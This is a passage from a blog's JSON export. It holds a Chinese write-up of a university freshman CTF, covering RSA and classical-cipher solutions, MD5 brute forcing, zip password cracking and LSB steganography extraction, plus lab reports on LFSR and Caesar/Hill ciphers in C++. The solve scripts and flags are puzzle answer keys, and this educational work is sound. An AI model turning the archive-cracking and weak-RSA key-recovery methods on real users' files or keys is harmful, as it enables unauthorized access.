sentences))","categories":[{"name":"密码学","slug":"密码学","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://gryffinbit.top/tags/RSA/"}],"author":"Gryffinbit"},{"title":"第一届信安大挑战WP","slug":"第一届信安大挑战WP","date":"2020-11-11T12:11:53.000Z","updated":"2024-11-12T07:00:18.000Z","comments":true,"path":"2020/11/11/第一届信安大挑战WP/","permalink":"https://gryffinbit.top/2020/11/11/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98WP/","excerpt":"","text":"CDUT第一届信安大挑战Misc（部分） 和 Crypto 的write up 密码学 crypto 1 题目描述 modulus：99742889480132178464693625265991467727088330702125690789109469022100733238623exponent：65537请提交私钥注：私钥为十六进制。Flag格式 dino{0x…….} 题解 已知p、q、e求d的经典RSA题型 首先将模数N，分解为两个大素数 p、q 12pip install factordb-pyclifactordb n的值 http://factordb.com/ 也可以求解 求解出p、q 1234567891011# python3.8import gmpy2p =gmpy2.mpz(336771668019607304680919844592337860739)q =gmpy2.mpz(296173636181072725338746212384476813557)e =gmpy2.mpz(65537)phi_n= (p - 1) * (q - 1)d = gmpy2.invert(e, phi_n)print (&quot;d is:&quot;)print (d) 得到的d是十进制，再转换为十六进制 进制转换： 1234567891011121314151617181920212223242526272829303132333435print &quot;1: 10-&gt;2\\n2: 10-&gt;16\\n3: 2-&gt;10\\n4: 16-&gt;10\\n5: 16-&gt;2\\n6: 2-&gt;16\\n&quot;c =int( raw_input(&quot;Input your choice:&quot;)) # c = choose# 10-&gt;2if c == 1: print bin(int(raw_input(&quot;Input your number:&quot;))) # 10-&gt;16elif c == 2: print hex(int(raw_input(&quot;Input your number:&quot;))) # 2-&gt;10elif c ==3: print str(int(raw_input(&quot;Input your number:&quot;),2)) # 16-&gt;10elif c ==4: print str(int(raw_input(&quot;Input your number:&quot;),16)) # 16-&gt;2elif c == 5: s = str(int(raw_input(&quot;Input your number&quot;),16)) # s = step print bin(int(s)) # 2-&gt;16elif c ==6: st = str(int(raw_input(&quot;Input your number:&quot;),2)) print hex(int(st)) Flag dino{0xb010bd96058b2972f5778c95fb8b8614406666727a4e4bda1338aa299b219e71} crypto 2 题目描述 丘比特是一位英俊儒雅的英国绅士，他的妻子埃尔西是一位美国淑女。两人的婚姻生活十分美满，直到一系列神秘信息的到来改变了一切。flag格式：dino{} 题目下载链接：https://gryffinbit.lanzous.com/ibQUciae1zi 题解 开局一张gif，可以看到有很多图片闪过。想办法把gif分解成一张一张的，可以找网站找软件找各种工具。 例如拖进PhotoShop： 可以看到图层被分解，然后对照表解密： 得到密文：THEDANCINGPEOPLE dino{THEDANCINGPEOPLE} crypto 3 题目描述 密文：iuf_xat_hmoz_gocwmx 题解 密文：iuf_xat_hmoz_gocwmx Playfair cipher是一种使用一个关键词方格来加密字符对的加密法。它依据一个5*5的正方形组成的密码表来编写，密码表里排列有25个字母。如果一种语言字母超过25个，可以去掉使用频率最少的一个。如，法语一般去掉w或k，德语则是把i和j合起来当成一个字母看待。英语中z使用最少，可以去掉它。 图片key.jpg是小恐龙dino，密钥key就是dino。 可以手写算出密码，或者用在线网站解密：http://rumkin.com/tools/cipher/playfair.php flag格式：dino{} dino{are_you_play_fairly} crypto 4 题目描述 🎵“我是一个酒精过敏的帅哥，我的酒品爆差，但是我爆爱喝。 I got drunk drunk drunk drunk 我是百变酒精，不是百变小樱。I got drunk drunk drunk drunk 今晚我要出门 酒局你得小心asmekusfkxjykebqmmsyvsbklsgkhsynkgjfphjlpjhljzqcqzfqyxqhfkiqfsxedglfkvdquzkmrsdtgsxajykmzkyjfeqyzkmrszjulmszhtzfjfhfjkyejlbsdzkcfsyckhyxjyysazlqlsdzbsdsjzfbscmqvxjyklhooms“ 法老可能酒精中毒了，胡言乱语了。Flag格式：flag{} 注：没有空格 题解 词频分析题 https://quipqiup.com/ welcome to dino challenge hope you enjoy it quipqiup is a fast and automated cryptogram solver by Edwin Olson It can solve simple substitution ciphers often found in newspapers here is the flag dino puzzle flag{dinopuzzle} crypto 5 题目描述 e(m)&#x3D;7m+21(mod26)密文：rxjfkzyhflag格式：dino{} 题解 仿射变换。 dino{security} crypto 6 题目描述 +21 +6 +1 +8flag格式: dino{} 题解 题目下载链接：https://gryffinbit.lanzous.com/i3Ejohp95wd 从64出发,+21 +6 +1 +8 base64 -&gt; base 85 -&gt; base 91 -&gt; base 92 -&gt; base 100 压缩包密码：HappyHalloween92： ;K23g2[f*!o9q#12Hb291：2f,0.&quot;!&quot;R7uMQ:nTwlEL*JB 85: 11joF0J4Om,#U@B9i3rh&lt;-N.I9IY$64： MTFqb0YwSjRPbSwjVUBCOWkzcmg8LU4uSTlJYFkk base100 👛👠👥👦👲👁👬👪👫👖🐹👘👪👜👖👄👜🐘👴 dino{Just_Base_Me!} crypto 7 题目描述 加入协会之后，你们会认识一个叫兔子的学姐。我期待和你们见面。送上Flag，格式dino{}。U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI 解题 Rabbit 密码 dino{Cute_Rabbit} crypto 8 题目描述 什么？你竟然不会口算MD5？算什么黑客，行吧，告诉你key是209. 剩下的自己想去，flag就是MD5都告诉你了，这都做不出来？flag格式：dino{} ![MD5](&#x2F;Users&#x2F;KarlieLee&#x2F;Desktop&#x2F;md&#x2F;2020 10 25【招新】信安大挑战 5ad161b8c17049feadbe5a2c2bf41cef&#x2F;MD5.jpg) 题目： 123456789import hashlib for i in range(32,127): for j in range(32,127): for k in range(32,127): m=hashlib.md5() m.update(&#x27;TASC&#x27;+chr(i)+&#x27;O3RJMV&#x27;+chr(j)+&#x27;WDJKX&#x27;+chr(k)+&#x27;ZM&#x27;) des=m.hexdigest() if &#x27;e9032&#x27; in des and &#x27;da&#x27; in des and &#x27;911513&#x27; in des: print (&quot;f9032994ebcbd08080091151380478b2&quot;) 题解 脚本运行print des就可以得到MD5，本题做了个混淆，print出来的是别的。e9032994dabac08080091151380478a2做了个凯撒密码位移，key&#x3D;209 解一下得到的就是flag 12345678910import hashlib for i in range(32,127): for j in range(32,127): for k in range(32,127): m=hashlib.md5() m.update(&#x27;TASC&#x27;+chr(i)+&#x27;O3RJMV&#x27;+chr(j)+&#x27;WDJKX&#x27;+chr(k)+&#x27;ZM&#x27;) des=m.hexdigest() if &#x27;e9032&#x27; in des and &#x27;da&#x27; in des and &#x27;911513&#x27; in des: print (des) print (&quot;f9032994ebcbd08080091151380478b2&quot;) dino{e9032994dabac08080091151380478a2} crypto 9 题目描述 RSA 题目下载链接：https://gryffinbit.lanzous.com/i99Xmhp6bba 题解 flag{5b55c69f-398d-47bc-ad37-4f268e8ae4b2} 需要python的基础知识。首先拿到一个脚本和一个output的执行文件。output是这个脚本的运行结果，把output放进终端，运行打印出来一串数字，对应着脚本来看，每串数字对应着一个print pow (x,y,z) 函数代表着x的y次方模z。反之，已知结果c1求msg m= gmpy2.iroot(c1,3)[0] 1234from libnum import *from gmpy2 import *m= gmpy2.iroot(c1,3)[0] 题目py 123456789101112131415161718192021222324252627282930313233343536from secret import e1,e2,flagfrom Crypto.Util.number import *msg = bytes_to_long(&quot;=========Hint:e1=&quot;+str(e1)+&quot;=============&quot;)p = getPrime(512)q = getPrime(512)N = p*qprint N#N1=92492770373119584460081987762423642921257844727187836762004909281192459271971634726161143981458071695340994591107972425352531669271078740978901135762304359798469976380706711716397909327202889036066332030534806956149533263677365472375053769919044969923810993041551455618809123044195807478835222921551845223673print pow(msg,3,N)# 求msg的3次方模N1#结果c1=28249132350044579687091110964285446575404805400757326954185222098803605008954490760462246663674360047951197296557689347856716297531621331430289344669498939239588624311221464757652619402073234993515450143594805022438694559765344247838048186137683783869848355994953125msg = bytes_to_long(flag)p = getPrime(1024)q = getPrime(1024)N = p*qc = pow(msg, e2, N)print N,e2#N2=27015781782143176377305444708803319343811009307670517970464768333771120997045181708841835585570829548449323842457013912871572311489720085833836018287540353234899258733164425361573491416926759037218022548655403489670177828691645649124879974295681372533797388585691439378293643867458900873524289213226600650695273378214798580343627514294295063280759129845430749116891862775979009255567653541999885963152760100703226634896555671676063304361506854160585739743294659176171738147833879545955904927967598053108666430271719503999512230196683852929862867406713611436850146222646354297511499309143157446775247989917315728885081#e2 是未知的，没有在output中显示print c#c=6960471390887676836770576717723665527999812876556281118485164081998911577875381908446602930344333654944091349042662834710841686602096786488652321359862587616056255592745697363730350424006430304398118412822538778460783959334956287873626339403915923932633438142296099193868446694776583016981952887671846310453413799566390944727222387714300425256165444782922011140095044159890292073622972447390685582541707094791774266611010707510165706469905665511940032155195482276746347896610980037890500866671279623501021060117466463857453415816945239635341057570437059560066260202940898394476654111403345827675113200431405898577228print(pow(p+q,e1,N ))#结果S1=1043358162140860962273728863918690254907683549241317489027248804399285815575770538413854959643097587139967903983728298468193229257795104589966904860928102961617976618240299512928763147662509317818932641083203337246219100049009339117603571633877302978817219689048124475419370026280279605865626353406562716520200330156419718727010377305953369496577186008235640834052476174479818668164269356133941979167253165318046864430749941469717776898395077805761110978284600985034996774850879017975655590682283621730288960471273895327469257980443060594976109602435213897419646191853646130932643009667656100697739228571988907108326print(pow(p+e1, q, N))#结果S2=2367294939363830936563488061919820815242930281093184747199533909423831655805653462926444204702027721204809679004109764873839689145594088483842010258154637719914884625388278232087919706082381019835448905310742695003695950771324141473767622775925225996118945331612570816055138158026344226500272784973866690432399708551301786027237710788172551956598563031161785118254195771411706070504960683710473948125061842911067623875812101363911946970263021272358739604106737786749756437515890114561301491995915709307108967981619075610635000644793538253463486203886648971971414160634218354735619624263269704236191332074536463815524# 解e1.pyfrom Crypto.Util.number import *from gmpy2 import *from libnum import *c1=28249132350044579687091110964285446575404805400757326954185222098803605008954490760462246663674360047951197296557689347856716297531621331430289344669498939239588624311221464757652619402073234993515450143594805022438694559765344247838048186137683783869848355994953125msg= gmpy2.iroot(c1,3)[0]print(n2s(msg))#e1=2020321 解题py 12345678910111213141516171819202122232425262728from Crypto.Util.number import *from gmpy2 import *from libnum import *S1 = 1043358162140860962273728863918690254907683549241317489027248804399285815575770538413854959643097587139967903983728298468193229257795104589966904860928102961617976618240299512928763147662509317818932641083203337246219100049009339117603571633877302978817219689048124475419370026280279605865626353406562716520200330156419718727010377305953369496577186008235640834052476174479818668164269356133941979167253165318046864430749941469717776898395077805761110978284600985034996774850879017975655590682283621730288960471273895327469257980443060594976109602435213897419646191853646130932643009667656100697739228571988907108326S2 = 2367294939363830936563488061919820815242930281093184747199533909423831655805653462926444204702027721204809679004109764873839689145594088483842010258154637719914884625388278232087919706082381019835448905310742695003695950771324141473767622775925225996118945331612570816055138158026344226500272784973866690432399708551301786027237710788172551956598563031161785118254195771411706070504960683710473948125061842911067623875812101363911946970263021272358739604106737786749756437515890114561301491995915709307108967981619075610635000644793538253463486203886648971971414160634218354735619624263269704236191332074536463815524e1 = 2020321N2 = 27015781782143176377305444708803319343811009307670517970464768333771120997045181708841835585570829548449323842457013912871572311489720085833836018287540353234899258733164425361573491416926759037218022548655403489670177828691645649124879974295681372533797388585691439378293643867458900873524289213226600650695273378214798580343627514294295063280759129845430749116891862775979009255567653541999885963152760100703226634896555671676063304361506854160585739743294659176171738147833879545955904927967598053108666430271719503999512230196683852929862867406713611436850146222646354297511499309143157446775247989917315728885081k1 = S2 - e1k2 = pow(k1,e1,N2)k3 = k2-S1q = gcd(k3,N2)#print(q)#162984526621683870625098586014910615083563535116972222345188747969350923464088799732530801488388575838451737347617234153531460507216470173767572431203228056853761835680227568853138262896922662664650377958457439852663861645573573134863458099139681417307977919507889782957584330019942586292868271385366037674313p = N2//q#print(p)165756727599372791875820541625601955300453776993770577352314168977734910665053298526454521639089078020881208027049933409502069159705827587730047406034448233170464600044968540270031406627778916422623991350852342453286144055883559111480220646693965481942701883316426823927969224691707129909621502373328134683537e2 = 65537p = 165756727599372791875820541625601955300453776993770577352314168977734910665053298526454521639089078020881208027049933409502069159705827587730047406034448233170464600044968540270031406627778916422623991350852342453286144055883559111480220646693965481942701883316426823927969224691707129909621502373328134683537q = 162984526621683870625098586014910615083563535116972222345188747969350923464088799732530801488388575838451737347617234153531460507216470173767572431203228056853761835680227568853138262896922662664650377958457439852663861645573573134863458099139681417307977919507889782957584330019942586292868271385366037674313c = 6960471390887676836770576717723665527999812876556281118485164081998911577875381908446602930344333654944091349042662834710841686602096786488652321359862587616056255592745697363730350424006430304398118412822538778460783959334956287873626339403915923932633438142296099193868446694776583016981952887671846310453413799566390944727222387714300425256165444782922011140095044159890292073622972447390685582541707094791774266611010707510165706469905665511940032155195482276746347896610980037890500866671279623501021060117466463857453415816945239635341057570437059560066260202940898394476654111403345827675113200431405898577228phi = (p-1)*(q-1)d = invert(e2,phi)m = pow(c,d,N2)print(n2s(m))#flag&#123;5b55c69f-398d-47bc-ad37-4f268e8ae4b2&#125; 解题脚本： 1234567891011121314151617181920212223242526272829from Crypto.Util.number import *from gmpy2 import *from libnum import *S1 = 1043358162140860962273728863918690254907683549241317489027248804399285815575770538413854959643097587139967903983728298468193229257795104589966904860928102961617976618240299512928763147662509317818932641083203337246219100049009339117603571633877302978817219689048124475419370026280279605865626353406562716520200330156419718727010377305953369496577186008235640834052476174479818668164269356133941979167253165318046864430749941469717776898395077805761110978284600985034996774850879017975655590682283621730288960471273895327469257980443060594976109602435213897419646191853646130932643009667656100697739228571988907108326S2 = 2367294939363830936563488061919820815242930281093184747199533909423831655805653462926444204702027721204809679004109764873839689145594088483842010258154637719914884625388278232087919706082381019835448905310742695003695950771324141473767622775925225996118945331612570816055138158026344226500272784973866690432399708551301786027237710788172551956598563031161785118254195771411706070504960683710473948125061842911067623875812101363911946970263021272358739604106737786749756437515890114561301491995915709307108967981619075610635000644793538253463486203886648971971414160634218354735619624263269704236191332074536463815524e1 = 2020321N2 = 27015781782143176377305444708803319343811009307670517970464768333771120997045181708841835585570829548449323842457013912871572311489720085833836018287540353234899258733164425361573491416926759037218022548655403489670177828691645649124879974295681372533797388585691439378293643867458900873524289213226600650695273378214798580343627514294295063280759129845430749116891862775979009255567653541999885963152760100703226634896555671676063304361506854160585739743294659176171738147833879545955904927967598053108666430271719503999512230196683852929862867406713611436850146222646354297511499309143157446775247989917315728885081k1 = S2 - e1k2 = pow(k1,e1,N2)k3 = k2-S1q = gcd(k3,N2)#print(q)#162984526621683870625098586014910615083563535116972222345188747969350923464088799732530801488388575838451737347617234153531460507216470173767572431203228056853761835680227568853138262896922662664650377958457439852663861645573573134863458099139681417307977919507889782957584330019942586292868271385366037674313p = N2//q#print(p)165756727599372791875820541625601955300453776993770577352314168977734910665053298526454521639089078020881208027049933409502069159705827587730047406034448233170464600044968540270031406627778916422623991350852342453286144055883559111480220646693965481942701883316426823927969224691707129909621502373328134683537e2 = 65537p = 165756727599372791875820541625601955300453776993770577352314168977734910665053298526454521639089078020881208027049933409502069159705827587730047406034448233170464600044968540270031406627778916422623991350852342453286144055883559111480220646693965481942701883316426823927969224691707129909621502373328134683537q = 162984526621683870625098586014910615083563535116972222345188747969350923464088799732530801488388575838451737347617234153531460507216470173767572431203228056853761835680227568853138262896922662664650377958457439852663861645573573134863458099139681417307977919507889782957584330019942586292868271385366037674313c = 6960471390887676836770576717723665527999812876556281118485164081998911577875381908446602930344333654944091349042662834710841686602096786488652321359862587616056255592745697363730350424006430304398118412822538778460783959334956287873626339403915923932633438142296099193868446694776583016981952887671846310453413799566390944727222387714300425256165444782922011140095044159890292073622972447390685582541707094791774266611010707510165706469905665511940032155195482276746347896610980037890500866671279623501021060117466463857453415816945239635341057570437059560066260202940898394476654111403345827675113200431405898577228phi = (p-1)*(q-1)d = invert(e2,phi)m = pow(c,d,N2)print(n2s(m))#flag&#123;5b55c69f-398d-47bc-ad37-4f268e8ae4b2&#125; Misc misc 1 题目描述 这张图片为什么这么大？ flag格式为：dino{} 题目下载链接：https://gryffinbit.lanzous.com/iRIKZhp6lkj 题解 binwalk -e 提取图片中的内容，扫描二维码得到base64，解码，然后再对结果URL解码 dino{c879f00c-1761-441f-97dd-14b0b7921278} misc 2 题目描述 二维码粉碎机 flag格式：flag{} 题目下载链接：https://gryffinbit.lanzous.com/iPfPIhp6qhg 题解 题解下载链接：https://gryffinbit.lanzous.com/is5wbiaer2b html和图片放在一个文件夹内，打开html 拼接二维码 方法：HTML表格图片拼接 flag{IsQRfun?} misc 3 题目描述 来感受下zip套娃的魅力吧 题目下载链接：https://gryffinbit.lanzous.com/ipv3Ihp6vyd 题解 zip是伪加密，解开之后得到一个whydocxtype.docx 用笔记本打开给了hint，是爆破的提示，把这个docx格式改成zip，打开里面有一个flag is here的zip。爆破得到密码，打开。是一个vhd，Windows下，文件管理系统，可以得到flag flag is here密码：114514 flag： dino{f0b91cb7-605a-4ec7-9ae5-6c3a412bd67d} misc 4 题目描述 hi！新生们好，欢迎来到信息安全协会，请踏上探索之路，拨开层层迷雾，找到到钥匙，打开宝箱，寻找flag吧。注意：蓝奏云下载文件的时候，不要共享密钥！！！ 题目下载链接：https://gryffinbit.lanzous.com/iigFYhp7a0j 题解 第一层： 考察点：文件头以及十六进制查看的用法 一张图，协会之门.jpg，文件头被删掉，打开失败。用010 editor打开，添加上文件头。可以把图片打开。打开以后是一个蓝奏云的链接，但是没有提取码。 提取码需要通过010 editor打开后。在最后一行的位置放着。 第二层：考察点：盲水印。 上一步的蓝奏云打开后，拿到一个txt 和 一个加密的zip。 txt内容： 209攻防实验室的大门，由一只表情凝重的猫猫守卫着！打败它！获得钥匙！欸。。。可是你发现，这竟然是影分身。。。机智的你想到需要找到本体，通过本体来发现影分身中的奥秘。 影分身说了一串你不懂的话“eW91X2xvbmdfZGFuZ19ndWlfaGFpXw&#x3D;&#x3D;” you_long_dang_gui_hai_ 解密那串话，得到的内容是zip的密码。zip中放的是盲水印的原图和一个hint：宝箱我藏起来了，钥匙在影分身那里。 通过原图的协助，将影分身中的盲水印解出来。影分身里的盲水印被解出来是一个key， key：welcome_to_dino209 第三层：考察点：图片隐写 本体里，还放着一个隐写，png里面隐藏了一个zip，将zip从png里剥离出来，得到的zip用key解压，拿到flag.txt Flag: dino{猫猫的凝视} misc 5 题目描述 新生们好，曾经CTF大赛中出现过一道yusa女神题。图片里的大脸把出题人折磨的很惨。于是，出题人决定出一道小麦腹肌男的题来报复。希望你们玩的开心。小麦腹肌男，永远滴神！ 题目下载地址：https://gryffinbit.lanzous.com/iPNslhp7n5c 题解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106# -*- coding:UTF-8 -*-from PIL import Imagedef mod(x,y): return x%y;def toasc(strr): return int(strr, 2)#le为所要提取的信息的长度，str1为加密载体图片的路径，str2为提取文件的保存路径def func(le,str1,str2): a=&quot;&quot; b=&quot;&quot; im = Image.open(str1) lenth = le*8 width = im.size[0] height = im.size[1] count = 0 for h in range(0, height): for w in range(0, width): #获得(w,h)点像素的值 pixel = im.getpixel((w, h)) #此处余3，依次从R、G、B三个颜色通道获得最低位的隐藏信息 if count%3==0: count+=1 b=b+str((mod(int(pixel[0]),2))) if count ==lenth: break if count%3==1: count+=1 b=b+str((mod(int(pixel[1]),2))) if count ==lenth: break if count%3==2: count+=1 b=b+str((mod(int(pixel[2]),2))) if count ==lenth: break if count == lenth: break with open(str2,&quot;wb&quot;) as f: for i in range(0,len(b),8): #以每8位为一组二进制，转换为十进制 stra = toasc(b[i:i+8]) #将转换后的十进制数视为ascii码，再转换为字符串写入到文件中 f.write(chr(stra)) stra =&quot;&quot; f.closed#文件长度le = 50#含有隐藏信息的图片new = &quot;/Users/KarlieLee/Downloads/f1ag/小麦肌肉男Dino.png&quot;#信息提取出后所存放的文件tiqu = &quot;/Users/KarlieLee/Desktop/f1ag.txt&quot;func(le,new,tiqu) lsb隐写，需要下载蓝奏云里的原图zip flag： dino{Dino209_yyds}","categories":[{"name":"write up","slug":"write-up","permalink":"https://gryffinbit.top/categories/write-up/"}],"tags":[{"name":"第一届信安大挑战","slug":"第一届信安大挑战","permalink":"https://gryffinbit.top/tags/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E5%A4%A7%E6%8C%91%E6%88%98/"}],"author":"Gryffinbit"},{"title":"LSFR流密码实验","slug":"LSFR流密码","date":"2020-08-20T15:13:21.000Z","updated":"2024-11-12T06:59:29.000Z","comments":true,"path":"2020/08/20/LSFR流密码/","permalink":"https://gryffinbit.top/2020/08/20/LSFR%E6%B5%81%E5%AF%86%E7%A0%81/","excerpt":"","text":"LFSR流密码 实验一、实验题目LFSR流密码 二、实验目的和要求编程实现简单地线性反馈移位寄存器，理解其工作原理，掌握流密码的算法结构和加解密过程。利用C++语言实现LFSR。通过不同初始状态生成相应序列，观察其周期特点。利用生成的序列对文本进行加密和解密运算。 三、实验环境clion 四、实验内容给定的 LFSR 结构如图，程序完成功能： （1）由给定的初始状态序列生成密钥序列（2）选择进行文件加密还是解密（3）如果选择文件加密，则从 in.txt 中读取明文，用密钥流序列进行加密，密文保存于 out.txt 中；如果选择文件解密，则从 out.txt 中读取密文，用密钥流序列进行解密，密文保存于 in.txt 中。 五、算法描述及实验步骤$$a_{n+t}&#x3D;c_na_t\\oplus c_{n-1}a_{t+1}\\oplus….\\oplus c_1a_{n+t-1},\\ t&#x3D;1,2,3..$$ 该实验以五级为例，n&#x3D;5，代入公式，根据图中的异或关系得到 $$a_{5+t}&#x3D;a_t\\oplus a_{3+t},t&#x3D;1,2,…$$ 根据该公式，生成密钥序列 $$a_6,a_7,a_8……….$$ 流密码的操作原理，将明文划分为字符或编码的基本单元。每个字符八字节，每个字符分别与密钥流进行加密。例如把字符转换为ascii码的二进制形式然后与随机密钥流进行异或运算，并输出结果 消息流: $$m&#x3D;m_1m_2m_3……m_i\\in M$$ 加密过后： $$c_i&#x3D;E_k(m_i)$$ 六、调试过程及结果（附截图） 七、总结体会❓代码如何将数字化的明文与流密钥异或成密文？ ‼️将明文划分为字符或编码的基本单元。每个字符八字节，每个字符分别与密钥流进行加密。例如把字符转换为ascii码的二进制形式然后与随机密钥流进行异或运算，并输出结果 八、源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;cmath&gt;#include&lt;fstream&gt;using namespace std;int main()&#123;/*下面是密钥的产生*///初始级数为5，周期为31 int a[31]=&#123;1,1,0,0,1&#125;; //初始的激活序列 for(int k=5;k&lt;31;++k) a[k]=(a[k-2]+a[k-5])%2; //这一步是根据公式$a_&#123;5+t&#125;=a_t\\oplus a_&#123;3+t&#125;,t=1,2,... %2即：异或运算也是模2加法运算 cout&lt;&lt;&quot;密钥如下：&quot;&lt;&lt;endl; for(int jj=0;jj&lt;31;++jj) cout&lt;&lt;a[jj]&lt;&lt;&#x27; &#x27;; cout&lt;&lt;endl;//////////////////////// int i=0,key; cout&lt;&lt;&quot;请选择操作方式：1-加密 2-解密&quot;&lt;&lt;endl; cin&gt;&gt;key; vector&lt;int&gt;s,ss; if(key==1||key==2) &#123; if(key==1) &#123; cout&lt;&lt;&quot;加密成功，密文见out.txt&quot;&lt;&lt;endl; ifstream in(&quot;in.txt&quot;); ofstream out(&quot;out.txt&quot;); char c; while(in&gt;&gt;c) &#123; int sum=0; int j; for(j=0;j&lt;8;++j) sum+=pow((double)2,(double)(7-j))*a[(i+j)%31]; if(i+j&gt;32) i=(i+j-1)%31+1; else i=i+8; s.push_back((int(c))^sum); &#125; for(int kk=0;kk&lt;s.size();++kk) &#123; out&lt;&lt;char(s[kk]); &#125; &#125; if(key==2) &#123; cout&lt;&lt;&quot;解密成功，明文见in.txt&quot;&lt;&lt;endl; ifstream in(&quot;out.txt&quot;); ofstream out(&quot;in.txt&quot;); char c; while(in&gt;&gt;c) &#123; int sum=0; int j; for(j=0;j&lt;8;++j) sum+=pow((double)2,(double)(7-j))*a[(i+j)%31]; if(i+j&gt;32) i=(i+j-1)%31+1; else i=i+8; s.push_back((int(c))^sum); &#125; for(int kk=0;kk&lt;s.size();++kk) out&lt;&lt;char(s[kk]); &#125; &#125; else cout&lt;&lt;&quot;操作无效！&quot;&lt;&lt;endl;&#125;","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"密码学","slug":"实验/密码学","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"流密码","slug":"流密码","permalink":"https://gryffinbit.top/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"}],"author":"Gryffinbit"},{"title":"单表代换/多表代换实验","slug":"单表多表代换实验","date":"2020-08-19T11:16:23.000Z","updated":"2024-11-12T07:00:19.000Z","comments":true,"path":"2020/08/19/单表多表代换实验/","permalink":"https://gryffinbit.top/2020/08/19/%E5%8D%95%E8%A1%A8%E5%A4%9A%E8%A1%A8%E4%BB%A3%E6%8D%A2%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"#单表代换、多表代换 实验 一、实验题目单表代换和多表代换 二、实验目的和要求通过实验熟练掌握凯撒密码和Hill密码算法原理，编程实现加密算法，熟悉模运算和扩展欧几里德算法，提高C++程序设计和密码运算基本能力。 单表代换编程实现凯撒密码，输入任意一段明文，对其加密并输出密文。多表代换编程实现 Hill 加密算法，输入一段无空格的五个小写字母明文，对其加密并输出密文。 三、实验环境Clion、macOS Catalina 10.15.6 四、实验内容4.1单表代换:凯撒密码密钥为 3，从文本文件中读取明文，用密钥加密，密文保存于对应密文数组。 4.2多表代换:1.密钥生成：Hill 加密的密钥矩阵 K 随机生成，需要进行在模 26 的意义下进行可逆性检测，这里可以用求行列式模 26 的逆元。2.读取明文并预处理：输入的明文是 5 个小写字母，彼此之间没有空格，而后放入 5 个元素的明文数组。3.加密：将密钥矩阵与明文数组左乘，在模 26 的意义下，生成密文数组。 4.解密：将密钥矩阵的伴随阵 D 求出，左乘密文数组，再乘密钥矩阵行列式的逆，从而完成逆矩阵左乘，都在模 26 的意义下。 五、算法描述及实验步骤5.1单表代换以凯撒密码为例： 加解密原理 $$c&#x3D;E_{key}(m)\\equiv m+key(mod\\ 26) , 0\\leq m \\leq25\\ \\ \\ 加密时，每个字母后移key位$$ $$m&#x3D;D_{key}(c)\\equiv c-key(mod\\ 26) , 0\\leq c \\leq25\\ \\ \\ \\ 解密时，每个字母前移key位$$ 建立一个plaintext.txt文件，用来存放需要加密的明文m。 利用fgets函数，来将文件中的字符读取到message中。逐字读取明文长短，并且复制出明文内容，将其打印出来。输入key。进行逐位循环。加密：c&#x3D;m+key(mod 26)。 将加密结果存储在ciphertext中。 并且打印出来。 5.2多表代换以Hillcipher为例： 加密原理： 将明文M，分成由n个字母构成的分组，对各个分组M加密： $$C_i \\equiv AM_i+B(mod\\ N),i&#x3D;1,2,3..j$$ (A,B)是密钥。A是 n*n的可逆矩阵。 解密： $$M_i\\equiv A^{-1}(C_i-B)(mod\\ N),i&#x3D;1,2,3..j$$ 为了满足可逆矩阵的条件： $$gcd(|A|,N)&#x3D;1 \\ \\ \\ \\ \\ \\ \\ |A|为行列式$$ 如果矩阵可逆，那么它的逆矩阵和它的伴随矩阵之间只差一个系数。 定义55的矩阵。用d来表示a、b的最大公约数。其中a代表的是|A|,b代表的是N。 为保证A是可逆矩阵。class Hill_Cipher 的目的，生成满足可逆条件的矩阵。根据加密算法对明文进行加密。* 六、调试过程及结果（附截图）6.1单表代换 6.2多表代换 七、总结体会7.1单表代换❓❓代码如何从输入的字符转换为可处理的数字？ ‼️通过ascii码的转换：如char A &#x3D; ‘65’ 加密时，进行逐位的循环操作。字母控制在A～Z 12345678910111213/* 测试代码 */#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;using namespace std;int main()&#123; char message[3]=&#123;&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;&#125;; if (message[1]&gt;65) cout&lt;&lt;message[1]&lt;&lt;endl; return 0;&#125; 测试目的。可以根据char类型ascii来进行大小的比较。 若ascii码对应的数值大于int的数字，则输出该字母。 B对应66，所以大于65，会输出B 7.2多表代换❓❓代码如何进行扩展欧几里德算法求逆元？ ‼️给定 a 和b。a 要有逆元 ， 那么gcd（ a ， b ) &#x3D; 1假设a的逆元 为x ， 那么就有 a * x mod b &#x3D; 1也就是 a * x + b * y &#x3D; 1。其中 x 就是 a的逆元。 1234567891011121314151617181920212223#include &lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;cstdio&gt;using namespace std;int x,y,q;void ex_Eulid(int a,int b)&#123; if(b==0)&#123; x=1;y=0;q=a; &#125; else&#123; ex_Eulid(b,a%b); double temp=x; x=y;y=temp-a/b*y; &#125;&#125;int main() &#123; int a,b; cin&gt;&gt;a&gt;&gt;b; if(a&lt;b)swap(a,b); ex_Eulid(a,b); printf(&quot;%d=(%d)*%d+(%d)*%d\\n&quot;,q,x,a,y,b); return 0;&#125; 八、源程序附录8.1单表代换12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;using namespace std;int main(int argc, char *argv[])&#123; FILE *file1; //FILE* 指针作为文件句柄，是文件访问的唯一标识，它由fopen函数创建 char message[50],plaintext[50],ciphertext[50]; //定义字符数组，fgets读入数据。message明文 int i,lenthofmessage,key; file1=fopen(&quot;plaintext.txt&quot;,&quot;r&quot;); //fopen打开文件成功，则返回一个有效的FILE*指针，否则返回空指针NULL //FILE 